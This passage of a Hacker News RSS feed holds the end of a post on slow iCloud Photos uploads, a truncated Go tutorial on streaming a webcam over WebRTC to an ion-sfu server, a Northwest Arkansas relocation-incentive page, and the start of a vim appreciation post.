
<p>Here are a few recommendations (for Apple) that could improve the perception and experience with iCloud Photos on macOS:</p>

<ul>
  <li>Call out incompatible media. <strong>Make it known when media needs to be converted.</strong> Or require incompatible media to be converted upon import into the Photos app.</li>
  <li>A progress bar stuck at 90% is more satisfying than one at 50%. <strong>Prioritize the upload of compatible media first.</strong> If your incompatible media is more recent, you’ll be stuck waiting for it convert before anything else gets uploaded.</li>
  <li><strong>Provide more insight</strong> as to when uploading vs conversion is happening behind-the-scenes.</li>
  <li><strong>Run full speed conversions when the Photos app is in the foreground.</strong></li>
</ul>



<p>My Mac has been plugged in 24/7 for the past 4 days and I still have 177 items left to “upload.”</p>



<p>iCloud Photos on macOS converts incompatible media locally before uploading to iCloud. It disguises the conversion process as part of the “upload” phase for iCloud Photos.</p>

<p><em>This issue is only with incompatible media imported to iCloud Photos via the Mac Photos app. It’s very unlikely your iPhone or iPad would be taking pictures and videos in an incompatible format.</em></p>

  </div></div>]]>
            </description>
            <link>https://shivpatel.io/software/2020/11/12/how-icloud-photos-architecture-causes-slow-uploads.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072695</guid>
            <pubDate>Thu, 12 Nov 2020 18:07:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a WebRTC Broadcaster in Golang using ion-sfu and media devices]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25072605">thread link</a>) | @taylored
<br/>
November 12, 2020 | https://gabrieltanner.org/blog/broadcasting-ion-sfu | <a href="https://web.archive.org/web/*/https://gabrieltanner.org/blog/broadcasting-ion-sfu">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section> <section><div uk-grid=""><div><section>  <!----> <section><!--kg-card-begin: markdown--><p>WebRTC, short for Web Real-Time Communication, is a communication protocol that enables real-time audio, video and data transmission on the web by utilizing peer to peer connections.</p>
<p>WebRTC also provides a Javascript API that is available by default in most browsers and helps developers implement the protocol in their applications. But there are also some implementations of the WebRTC protocol in other languages.</p>
<p>In this tutorial, you will build a video broadcasting application that reads the camera in Golang and sends it to the ION-SFU (Selective forwarding unit) which allows WebRTC sessions to scale more efficiently.</p>
<p>The application will also feature a small frontend that lets you watch the video you published by reading it from the ION-SFU server.</p>
<h2 id="prerequisites">Prerequisites</h2>
<p>Before you begin this guide, you’ll need the following:</p>
<ul>
<li>A valid Golang installation.</li>
<li>Camera connected to your computer that can be read using Video for Linux as a source for the video stream.</li>
<li>(Optional) If you want to connect with devices that are not on your network you will need to add a TURN server to your application. If you want to know more about TURN and how to set up your own check out <a href="https://gabrieltanner.org/blog/turn-server">this article</a>.</li>
</ul>
<h2 id="technologystack">Technology Stack</h2>
<p>Now that you have an overview of what you are going to build let's take a closer look at the tools in use and how they work with each other.</p>
<!-- TODO: Add illustration -->
<p>Let's break the different components down:</p>
<ul>
<li><a href="https://github.com/pion/webrtc">Pion</a> - Pure Golang implementation of the WebRTC protocol. Used to establish a peer connection to ION-SFU and send the video stream.</li>
<li><a href="https://github.com/pion/ion-sfu">ION SFU</a> - ION SFU (Selective Forwarding Unit) is a video routing service that allows Webrtc sessions to scale more efficiently.</li>
<li><a href="https://github.com/pion/mediadevices">Pion mediadevices</a> - Golang implementation of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices">Mediadevices API</a> which is used to read the camera as a Mediastream that can be sent using the peer connection.</li>
</ul>
<p>One main benefit of this is that you can read the camera without the need to open a browser tab. Using a selective forwarding unit will also help a lot with performance and scaling the application for a large size of users.</p>
<p>This article assumes a basic knowledge of WebRTC. If you do not have any previous experience, I recommend reading the free book <a href="https://webrtcforthecurious.com/docs/01-what-why-and-how/">WebRTC for the curious</a>.</p>
<h2 id="settingupionsfu">Setting up ION-SFU</h2>
<p>In this section, you will clone and configure the ION-SFU server so that you can use it with your application.</p>
<p>First, you will clone the repository so you have all the resources needed to start setting up your selective forwarding unit:</p>
<pre><code>git clone https://github.com/pion/ion-sfu.git
</code></pre>
<p>This command will clone the ION-SFU repository from Github and create a folder with the name of <strong>ion-sfu</strong> in your directory. Now enter the directory using the following command:</p>
<pre><code>cd ion-sfu
</code></pre>
<p>Next you can edit the configuration of the sfu by changing the <strong>config.toml</strong> file. The standard configurations are fine for testing and local use but I would recommend adding a STUN and TURN server if you try to access the server from a device in another network.</p>
<p>If you are not sure how to create a TURN server I would recommend reading <a href="https://gabrieltanner.org/blog/turn-server">this guide</a>.</p>
<p>Once you are done with the configuration you can start the server using the following command:</p>
<pre><code>go build ./cmd/signal/json-rpc/main.go &amp;&amp; ./main -c config.toml
</code></pre>
<p>Alternatively you can also start the server using Docker if you prefer that over starting it using Golang.</p>
<pre><code>docker run -p 7000:7000 -p 5000-5020:5000-5020/udp pionwebrtc/ion-sfu:latest-jsonrpc
</code></pre>
<p>You have now successfully set up your ION-SFU server and should see the following output in the console.</p>
<pre><code>config config.toml load ok!
[2020-10-12 19:04:19.017] [INFO] [376][main.go][main] =&gt; --- Starting SFU Node ---
[2020-10-12 19:04:19.018] [INFO] [410][main.go][main] =&gt; Listening at http://[:7000]
</code></pre>
<h2 id="creatingtheproject">Creating the project</h2>
<p>Now that the setup and configuration of the ion-sfu server are done it is time to create the project</p>
<p>First, you will need to create a directory and enter it.</p>
<pre><code>mkdir mediadevice-broadcast &amp;&amp; cd mediadevice-broadcast
</code></pre>
<p>After that you can continue by creating all the files needed for the project using the following command:</p>
<pre><code>mkdir public
touch main.go public/index.html public/index.js public/style.css
</code></pre>
<p>There are also two packages that need to be installed to follow this article.</p>
<pre><code>sudo apt-get install -y v4l-utils
sudo apt-get install -y libvpx-dev
</code></pre>
<p>If you are not on Linux you might need to download different packages. Look at the <a href="https://github.com/pion/mediadevices">media devices documentation</a> for more information.</p>
<h2 id="establishingawebrtcconnection">Establishing a WebRTC connection</h2>
<p>Before any data can be exchanged using WebRTC, there must first be an established peer-to-peer connection between two WebRTC agents. Since the peer-to-peer connection often cannot be established directly there needs to be some signaling method.</p>
<p>Signaling to the ion-sfu will be handled over the Websockets protocol. For that, we will implement a simple Websockets boilerplate using the <em>gorilla/websocket</em> library that connects to the Websockets server and allows us to receive the incoming message and send our own.</p>
<pre><code>package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/url"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

var addr string

func main() {
	flag.StringVar(&amp;addr, "a", "localhost:7000", "address to use")
	flag.Parse()

	u := url.URL{Scheme: "ws", Host: addr, Path: "/ws"}
	log.Printf("connecting to %s", u.String())

	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()

	// Read incoming Websocket messages
	done := make(chan struct{})

	go readMessage(c, done)

	&lt;-done
}

func readMessage(connection *websocket.Conn, done chan struct{}) {
	defer close(done)
	for {
		_, message, err := connection.ReadMessage()
		if err != nil || err == io.EOF {
			log.Fatal("Error reading: ", err)
			break
		}

		fmt.Printf("recv: %s", message)
	}
}
</code></pre>
<p>Now let's walk through the code for better understanding:</p>
<ul>
<li>The flag is used to dynamically provide the URL of the Websockets server when starting the script and has a standard value of <strong>localhost:7000</strong></li>
<li>The URL is used to create a Websockets client using the <strong>Dial</strong> method. Then we check if the connection resulted in an error and print a log if that is the case.</li>
<li>The <strong>readMessage</strong> function then reads the incoming messages by calling <strong>ReadMessage()</strong> on the Websocket connection and is run as a Go routine so it doesn't block the main thread and can run in the background.</li>
<li>The last line of the <strong>main()</strong> function makes sure that the script runs as long as the <strong>done</strong> variable is not closed.</li>
</ul>
<p>The next step is creating a peer connection to the ion-sfu and handling the incoming WebRTC signaling events.</p>
<pre><code>var peerConnection *webrtc.PeerConnection

func main() {
...

    config := webrtc.Configuration{
		ICEServers: []webrtc.ICEServer{
			{
				URLs: []string{"stun:stun.l.google.com:19302"},
			},
			/*{
				URLs:       []string{"turn:TURN_IP:3478?transport=tcp"},
				Username:   "username",
				Credential: "password",
			},*/
		},
		SDPSemantics: webrtc.SDPSemanticsUnifiedPlanWithFallback,
	}

	// Create a new RTCPeerConnection
	mediaEngine := webrtc.MediaEngine{}

	vpxParams, err := vpx.NewVP8Params()
	if err != nil {
		panic(err)
	}
	vpxParams.BitRate = 500_000 // 500kbps

	codecSelector := mediadevices.NewCodecSelector(
		mediadevices.WithVideoEncoders(&amp;vpxParams),
	)

	codecSelector.Populate(&amp;mediaEngine)
	api := webrtc.NewAPI(webrtc.WithMediaEngine(mediaEngine))
	peerConnection, err = api.NewPeerConnection(config)
	if err != nil {
		panic(err)
	}

}
</code></pre>
<p>Here we first create a WebRTC config where we define our STUN and TURN server that will be used in the signaling process. After, that we create a <em>MediaEngine</em> that lets us define the codecs supported by the peer connection.</p>
<p>With all that configuration done we can create a new peer connection by calling the <strong>NewPeerConnection</strong> function on the WebRTC API we just created.</p>
<p>Before sending the offer to the ion-sfu server over Websockets we first need to add the video and audio stream. This is where the media device library comes into play to read the video from the camera.</p>
<pre><code>    fmt.Println(mediadevices.EnumerateDevices())

	s, err := mediadevices.GetUserMedia(mediadevices.MediaStreamConstraints{
		Video: func(c *mediadevices.MediaTrackConstraints) {
			c.FrameFormat = prop.FrameFormat(frame.FormatYUYV)
			c.Width = prop.Int(640)
			c.Height = prop.Int(480)
		},
		Codec: codecSelector,
	})

	if err != nil {
		panic(err)
	}

	for _, tracker := range s.GetTracks() {
		tracker.OnEnded(func(err error) {
			fmt.Printf("Track (ID: %s) ended with error: %v\n",
				tracker.ID(), err)
		})

		webrtcTrack, err := tracker.Bind(peerConnection)
		if err != nil {
			panic(err)
		}

		_, err = peerConnection.AddTransceiverFromTrack(webrtcTrack,
			webrtc.RtpTransceiverInit{
				Direction: webrtc.RTPTransceiverDirectionSendonly,
			},
		)

		if err != nil {
			panic(err)
		}
	}
</code></pre>
<p>Once an instance of the media devices library is created using the peer connection you can get the user media using the <strong>GetUserMedia</strong> function and passing the parameters.</p>
<p>One configuration change you might need to make is altering the <strong>FrameFormat</strong> to support your connected camera. You can check the frame format of your camera with the following command:</p>
<pre><code>v4l2-ctl --all
</code></pre>
<p>All supported formats can also be found in the <a href="https://github.com/pion/mediadevices/blob/master/pkg/frame/decode.go#L7-L26">media devices Github repository</a>.</p>
<p>The offer can now be created and saved into the local description of the peer connection.</p>
<pre><code>    // Creating WebRTC offer
	offer, err := peerConnection.CreateOffer(nil)

	// Set the remote SessionDescription
	err = peerConnection.SetLocalDescription(offer)
	if err != nil {
		panic(err)
	}
</code></pre>
<p>The next step is to send the offer over to the sfu using Websockets. The Websockets message is JSON and needs a specific structure to be recognized by the sfu.</p>
<p>Therefore we need to create a struct holding our offer and the required sid that specifies the room we want to join that we can then convert into JSON.</p>
<pre><code>type SendOffer struct {
	SID   string                     `json:sid`
	Offer *webrtc.SessionDescription `json:offer`
}
</code></pre>
<p>Now we convert our offer …</p></section></section></div></div></section></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gabrieltanner.org/blog/broadcasting-ion-sfu">https://gabrieltanner.org/blog/broadcasting-ion-sfu</a></em></p>]]>
            </description>
            <link>https://gabrieltanner.org/blog/broadcasting-ion-sfu</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072605</guid>
            <pubDate>Thu, 12 Nov 2020 17:59:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[$10K and a free bike incentive to move to NW Arkansas]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25072346">thread link</a>) | @bboyan
<br/>
November 12, 2020 | https://findingnwa.com/incentive/ | <a href="https://web.archive.org/web/*/https://findingnwa.com/incentive/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>
		<div>
			
			
		<div id="fws_5fb11d508ce18" data-column-margin="default" data-midnight="light" data-top-percent="12%" data-bottom-percent="10%"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="fade-in" data-delay="0">
		<div>
			<div>
				
<div>
	<p>The Northwest Arkansas Council is investing more than $1 million over six months to attract top talent to the region through the Life Works Here initiative, which brings to light the lifestyle and career benefits offered by the region.</p>
</div>




			</div> 
		</div>
	</div> 

	 
</div></div>
		
		
		<div id="overview" data-column-margin="default" data-midnight="dark" data-top-percent="5%" data-bottom-percent="3%"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
			<div>
				<div id="fws_5fb11d509948f" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
		<p>
			<h2>Welcome to Northwest Arkansas</h2>
		</p> 
	</div>
	</div> 
</div></div><div id="fws_5fb11d509a393" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
		<div>
			
<div>
	<p>
		<h4><span>With one of the best costs of living, plentiful outdoor lifestyle perks, nationally ranked arts, culture and cuisine scenes, and per capita income that’s 14% higher than the national average, the Northwest Arkansas region offers a unique opportunity to create balance for those eager to move from congested and expensive larger cities and suburbs.</span></h4>
	</p>
</div>




		</div> 
	</div>
	</div> 
</div></div>
			</div> 
		</div>
	</div> 
</div></div>
		<div id="fws_5fb11d509b559" data-column-margin="none" data-midnight="light" data-top-percent="2%" data-bottom-percent="6%"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="fade-in" data-delay="0">
		<div>
			<div>
				<div id="fws_5fb11d509be60" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="left" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
		<div>
			<div data-max-width="125%" data-max-width-mobile="default" data-border-radius="none" data-shadow="none" data-animation="fade-in">
      <div>
        <div data-hover-animation="none"> 
          <p><img data-delay="0" height="625" width="910" data-animation="fade-in" src="https://findingnwa.com/wp-content/uploads/2018/08/oztrail.png" alt="" srcset="https://findingnwa.com/wp-content/uploads/2018/08/oztrail.png 910w, https://findingnwa.com/wp-content/uploads/2018/08/oztrail-300x206.png 300w, https://findingnwa.com/wp-content/uploads/2018/08/oztrail-768x527.png 768w, https://findingnwa.com/wp-content/uploads/2018/08/oztrail-600x412.png 600w" sizes="(min-width: 1450px) 75vw, (min-width: 1000px) 85vw, 100vw">
          </p>
        </div>
      </div>
    </div>
		</div> 
	</div>
	</div> 
</div></div>
			</div> 
		</div>
	</div> 

	<div data-using-bg="true" data-t-w-inherits="default" data-overlay-color="true" data-bg-cover="" data-padding-pos="all" data-has-bg-color="true" data-bg-color="#ef404d" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
			<div>
				<div id="fws_5fb11d509dda7" data-midnight="" data-column-margin="default"><div>
	 

	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="fade-in-from-bottom" data-delay="0">
		<div>
		<div>
			<p data-style="half_text" data-using-custom-color="true" data-animation-delay="false" data-color="#ffcdc0" data-color-gradient="rgba(255,107,48,0.01)">
<h2>You’re looking for a great place to <em>live, work and play.</em></h2>
</p>
<div>
	<p>We’re looking for new residents to add to the vibrancy of our growing community.</p>
</div>




		</div> 
	</div>
	</div> 
</div></div>
			</div> 
		</div>
	</div> 
</div></div>
		<div id="possible" data-column-margin="default" data-midnight="light" data-top-percent="10%" data-bottom-percent="10%"><div>
	 

	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="grow-in" data-delay="300">
		<div>
			<div>
				
	<div>
		<div>
			
			<p><iframe title="What Makes a Community Feel Like Home?" width="1080" height="608" src="https://www.youtube.com/embed/yNN-5rYKIeI?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
		</div>
	</div>

			</div> 
		</div>
	</div> 
</div></div>
		<div id="benefits" data-column-margin="none" data-midnight="dark"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
			<div>
				<div id="fws_5fb11d50a6330" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="fade-in-from-bottom" data-delay="0">
		<div>
		<div>
			<p data-style="half_text" data-using-custom-color="true" data-animation-delay="false" data-color="#ef404d" data-color-gradient="rgba(255,107,48,0.01)">
<h3>What we’re doing</h3>
</p>
<div>
	<div>
		<p>The <a href="https://www.nwacouncil.org/" target="_blank" rel="noopener noreferrer">Northwest Arkansas Council</a> is investing more than $1 million over six months to attract top talent to the region through the Life Works Here initiative, which brings to light the lifestyle and career benefits offered by the region.</p>
<p>The initiative is sponsored by the Northwest Arkansas Council and made possible by philanthropic support from the <a href="https://www.waltonfamilyfoundation.org/" target="_blank" rel="noopener noreferrer">Walton Family Foundation</a> at the recommendation of Steuart Walton and Tom Walton.</p>
	</div>
</div>




		</div> 
	</div>
	</div> 
</div></div><div id="fws_5fb11d50a6fb3" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="fade-in-from-bottom" data-delay="0">
		<div>
		<div>
			<p data-style="half_text" data-using-custom-color="true" data-animation-delay="false" data-color="#ef404d" data-color-gradient="rgba(255,107,48,0.01)">
<h3>What’s in it for you?</h3>
</p>
<div>
	<div>
		<p>Northwest Arkansas is a great place to work, live and play: for recent grads, families, career changers, entrepreneurs, artists and more. We’re offering top remote working talent – maybe you? – a $10,000 cash incentive to move to the region. The funds will help with everything you need to set up your new life in Northwest Arkansas.</p>
<p>In addition to $10,000, incentive recipients will be gifted a street or mountain bicycle to help you take advantage of the 162 miles of paved trails, the 37-mile Razorback Regional Greenway and the 322 miles of world-class mountain biking trails that has made outdoor enthusiasts flock to the area. Alternatively, participants can choose an annual membership to one of our world-class arts and cultural institutions.</p>
	</div>
</div>




		</div> 
	</div>
	</div> 
</div></div><div id="fws_5fb11d50a7a39" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="fade-in-from-bottom" data-delay="0">
		<div>
		<div>
			<p data-style="half_text" data-using-custom-color="true" data-animation-delay="false" data-color="#ef404d" data-color-gradient="rgba(255,107,48,0.01)">
<h3>Where do I apply?</h3>
</p>
<div>
	<p>Can you work anywhere?&nbsp; <strong>You can truly live here.</strong></p>
</div>




		</div> 
	</div>
	</div> 
</div></div><div data-style="default"><div data-inner-wrap="true"><h3><a href="#"><i></i>Check Your Eligibility</a></h3><div><div><div data-list-icon="none" data-animation="true" data-animation-delay="0" data-color="accent-color" data-spacing="default" data-alignment="left"> 
<ol>
<li><span>At least 24 years old</span></li>
<li><span>Have at least two years of work experience</span></li>
<li><span>Have full-time employment (which includes self-employment)</span></li>
<li><span>Currently resides outside of the state of Arkansas&nbsp;</span></li>
<li><span>Can relocate to Northwest Arkansas within six months of acceptance</span></li>
<li><span>U.S. citizen or has the necessary credentials required to work legally in the U.S.</span></li>
</ol>
 </div></div></div></div></div>




















			</div> 
		</div>
	</div> 

	 
</div></div>
		
		<div id="fws_5fb11d50b50cc" data-column-margin="default" data-midnight="light" data-top-percent="8%" data-bottom-percent="8%"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
			<div>
				<div id="fws_5fb11d50b5ad2" data-midnight="" data-column-margin="default"><div>
	 

	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="left-right" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
		<div>
			<p data-style="half_text" data-using-custom-color="true" data-animation-delay="false" data-color="#ef404d" data-color-gradient="rgba(255,107,48,0.01)">
<h2><span>Take a closer look at Northwest Arkansas</span></h2>
</p>
<div>
	<p><span>You’ll quickly come to realize, life works here. </span><span>Employment is abundant, housing is affordable, commutes are short, and the region is filled with a sense of possibility, a place where you can have a real impact.</span></p>
</div>



<p><a href="https://findingnwa.com/regional-guide/" data-color-override="false" data-hover-color-override="false" data-hover-text-color-override="#fff"><span>Explore Northwest Arkansas</span><i></i></a>
		</p></div> 
	</div>
	</div> 

	 
</div></div>
			</div> 
		</div>
	</div> 
</div></div>
		
		<div id="jobs" data-column-margin="default" data-midnight="light"><div>
	<div data-using-bg="true" data-t-w-inherits="default" data-overlay-color="true" data-bg-cover="true" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="0.4" data-hover-bg="" data-hover-bg-opacity="0.4" data-animation="grow-in" data-delay="0">
		<div>
			<div>
				<p data-animation-type="line-reveal-by-space" data-animation-delay="0" data-custom-font-size="false"><h3>Seeking a new career opportunity?</h3></p><p>With more than 10,000 open positions and an exceedingly low 2.8% unemployment rate, your next adventure awaits you in Northwest Arkansas.</p><p><a target="_blank" href="https://workforceconnection.careerconcourse.com/" data-color-override="false" data-hover-color-override="#ef404d" data-hover-text-color-override="#ffffff"><span>Search Here</span></a></p>
			</div> 
		</div>
	</div> 

	<div data-using-bg="true" data-t-w-inherits="default" data-overlay-color="true" data-bg-cover="true" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="0.5" data-hover-bg="" data-hover-bg-opacity="0.5" data-animation="grow-in" data-delay="150">
		<div>
			<div>
				<p data-animation-type="line-reveal-by-space" data-animation-delay="0" data-custom-font-size="false"><h3>Find a place to call home.</h3></p><p>With one of the best costs of living in the nation, you can find your dream home in Northwest Arkansas.</p><p><a target="_blank" href="https://www.zillow.com/homes/for_sale/_type/3-_beds/2.0-_baths/?searchQueryState=%7B%22pagination%22%3A%7B%7D%2C%22usersSearchTerm%22%3A%22northwest%20arkansas%22%2C%22mapBounds%22%3A%7B%22west%22%3A-94.71758586468067%2C%22east%22%3A-93.49810344280567%2C%22south%22%3A35.649884080973045%2C%22north%22%3A36.597180790040504%7D%2C%22isMapVisible%22%3Atrue%2C%22filterState%22%3A%7B%22beds%22%3A%7B%22min%22%3A3%7D%2C%22baths%22%3A%7B%22min%22%3A2%7D%2C%22sort%22%3A%7B%22value%22%3A%22globalrelevanceex%22%7D%2C%22pmf%22%3A%7B%22value%22%3Afalse%7D%2C%22pf%22%3A%7B%22value%22%3Afalse%7D%2C%22ah%22%3A%7B%22value%22%3Atrue%7D%2C%22con%22%3A%7B%22value%22%3Afalse%7D%2C%22mf%22%3A%7B%22value%22%3Afalse%7D%2C%22manu%22%3A%7B%22value%22%3Afalse%7D%2C%22tow%22%3A%7B%22value%22%3Afalse%7D%2C%22apa%22%3A%7B%22value%22%3Afalse%7D%2C%22sf%22%3A%7B%22value%22%3Afalse%7D%2C%22land%22%3A%7B%22value%22%3Afalse%7D%7D%2C%22isListVisible%22%3Atrue%7D" data-color-override="false" data-hover-color-override="#ef404d" data-hover-text-color-override="#ffffff"><span>Search Here</span></a></p>
			</div> 
		</div>
	</div> 
</div></div>
		<div id="qa" data-column-margin="default" data-midnight="dark" data-bottom-percent="3%"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
			<div>
				




<div data-style="minimal"><div data-inner-wrap="true"><h3><a href="#"><i></i>Why is the NWA Council offering the incentive?</a></h3><div><div>
<div>
	<div>
		<p><span>Northwest Arkansas has more than 10,000 job openings right now and has a shortage of talent to fill available STEAM jobs. We want to attract talent who will help us build a richer long-term talent pipeline that supports our thriving local economy. </span></p>
<p><span>The incentive is specifically targeting remote workers – we are looking for people who can meaningfully contribute to and actively participate in our vibrant community.</span></p>
	</div>
</div>



</div></div></div><div data-inner-wrap="true"><h3><a href="#"><i></i>Who is the ideal candidate for the program?</a></h3><div><div>
<div>
	<p><span>We’re looking for all kinds of talent, but the most in-demand talent in our region are STEAM professionals and entrepreneurs.</span> <span>We’ll assess the applicants’ skills in relation to our region’s needs, as well as what they can add to our community.</span> <span>We’re not looking for someone who can only do a good job at work. We’re looking for people who will add to the vibrancy of our community.</span></p>
</div>



</div></div></div><div data-inner-wrap="true"><h3><a href="#"><i></i>What types of incentives will recipients receive?</a></h3><div><div>
<div>
	<p><span>In addition to the $10,000 grant, recipients will be gifted either a bike – to help new residents take advantage of the outdoors on their own terms – or a free annual membership to one of our world-class arts and cultural institutions – Crystal Bridges, Momentary, Amazeum, TheatreSquared, Walton Arts Center and Walmart AMP.</span></p>
</div>



</div></div></div><div data-inner-wrap="true"><h3><a href="#"><i></i>Are there qualifications?</a></h3><div><div><div id="eligibility" data-midnight="" data-column-margin="default"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
		<div>
			
<div>
	<div>
		<p><span>In order to be eligible for the program, applicants must have the ability to relocate to Northwest Arkansas within six months of acceptance, sign a lease for local housing or purchase a house, be at least 24 years old, have at least two years of work experience, have full-time remote employment (which includes self-employment), currently reside outside of the state of Arkansas, and be a U.S. citizen or have the necessary credentials required to work legally in the U.S.</span></p>
<p><strong>Eligibility Check List:</strong></p>
<ol>
<li><span>At least 24 years old</span></li>
<li><span>Have at least two years of work experience</span></li>
<li><span>Have full-time employment (which includes self-employment)</span></li>
<li><span>Currently resides outside of the state of Arkansas&nbsp;</span></li>
<li><span>Can relocate to Northwest Arkansas within six months of acceptance</span></li>
<li><span>U.S. citizen or has the necessary credentials required to work legally in the U.S.</span></li>
</ol>
	</div>
</div>




		</div> 
	</div>
	</div> 
</div></div></div></div></div><div data-inner-wrap="true"><h3><a href="#"><i></i>How are recipients selected?</a></h3><div><div>
<div>
	<p><span>A review panel selected by the Northwest Arkansas Council will evaluate individual applicants, interview candidates and award the incentives to selected applicants.</span></p>
</div>



</div></div></div></div>




















			</div> 
		</div>
	</div> 
</div></div>
		
		<div id="fws_5fb11d50c8e1f" data-column-margin="default" data-midnight="dark" data-top-percent="8%"><div>
	<div data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
			<div>
				<div id="fws_5fb11d50c9875" data-midnight="" data-column-margin="default"><div>
	 

	<div data-cfc="true" data-t-w-inherits="default" data-bg-cover="" data-padding-pos="all" data-has-bg-color="false" data-bg-color="" data-bg-opacity="1" data-hover-bg="" data-hover-bg-opacity="1" data-animation="" data-delay="0">
		<div>
		<div>
			
<div>
	<p>
		<h4><span>We’d love to share more about what makes Northwest Arkansas the perfect place to live.</span></h4>
	</p>
</div>




		</div> 
	</div>
	</div> 

	 
</div></div>
			</div> 
		</div>
	</div> 
</div></div>
		
		
		
			
		</div><!--/row-->
	</div><!--/container-->
</div></div>]]>
            </description>
            <link>https://findingnwa.com/incentive/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25072346</guid>
            <pubDate>Thu, 12 Nov 2020 17:40:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My minimalist .vimrc in a VIM appreciation post – maybe it is useful]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25072323">thread link</a>) | @banyek
<br/>
November 12, 2020 | https://blog.balazspocze.me/2020/11/04/happy-birthday-vim/ | <a href="https://web.archive.org/web/*/https://blog.balazspocze.me/2020/11/04/happy-birthday-vim/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
	<p><a href="#content">Skip to content</a></p><!-- #masthead -->

	<div id="content">

	<div id="primary">
		<main id="main">

		
<article id="post-361">
	<!-- .entry-header -->

	<div>
		
<p>Vim turned 29 this day. Yay! I am a heavy vim user, it is my editor of choice in every operating system, however, I always installing some GUI editors as well (atom or sublime) for quick copy-paste tasks.</p>



<p>But this post is about vim. </p>



<p>I pretty much love it. I love the way how seamlessly it integrates into my daily workflow. I avoid using vim plugins and fancy configuration parameters, I try to keep it clean and easy. (Yes, I’ll share my .vimrc at the end of this post)</p>



